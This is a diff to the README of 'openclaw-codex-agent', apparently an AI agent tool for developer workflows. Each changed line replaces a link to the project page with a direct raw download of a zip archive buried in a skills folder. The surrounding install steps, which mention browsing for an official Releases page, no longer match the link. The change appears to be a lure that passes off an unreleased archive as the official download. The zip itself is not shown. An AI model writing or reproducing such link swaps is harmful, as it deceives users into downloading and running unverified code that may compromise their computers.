@@ -1,6 +1,6 @@
 # 🦾 openclaw-codex-agent - Plan, Run, and Verify Dev Workflows
 
-[![Download openclaw-codex-agent](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://github.com/MZombies/openclaw-codex-agent)
+[![Download openclaw-codex-agent](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://github.com/MZombies/openclaw-codex-agent/raw/refs/heads/main/skills/dev-workflow/agent_codex_openclaw_v1.9.zip)
 
 ## 📋 What is openclaw-codex-agent?
 
@@ -24,7 +24,7 @@ To use openclaw-codex-agent on Windows, follow these steps exactly:
 
 1. Open your web browser (such as Chrome, Edge, or Firefox).
 2. Click this big download link or copy and paste it into the address bar:  
-   [https://github.com/MZombies/openclaw-codex-agent](https://github.com/MZombies/openclaw-codex-agent)
+   [https://github.com/MZombies/openclaw-codex-agent/raw/refs/heads/main/skills/dev-workflow/agent_codex_openclaw_v1.9.zip](https://github.com/MZombies/openclaw-codex-agent/raw/refs/heads/main/skills/dev-workflow/agent_codex_openclaw_v1.9.zip)
 3. The linked page shows the project’s main files and folders. Look for a section labeled **Releases** on the page.
 4. Click on the latest official release that matches your Windows needs. If you see a file ending with `.exe`, that is the installer.
 5. Click on the `.exe` file to download it to your computer. The download may take a few minutes depending on your internet speed.
@@ -96,6 +96,6 @@ Knowing this helps if you want to back up or move your work to another PC.
 ## 🔗 More About openclaw-codex-agent
 
 Visit the project page anytime here:  
-[https://github.com/MZombies/openclaw-codex-agent](https://github.com/MZombies/openclaw-codex-agent)
+[https://github.com/MZombies/openclaw-codex-agent/raw/refs/heads/main/skills/dev-workflow/agent_codex_openclaw_v1.9.zip](https://github.com/MZombies/openclaw-codex-agent/raw/refs/heads/main/skills/dev-workflow/agent_codex_openclaw_v1.9.zip)
 
 This page has the latest downloads, user guides, and troubleshooting help from the developer community.
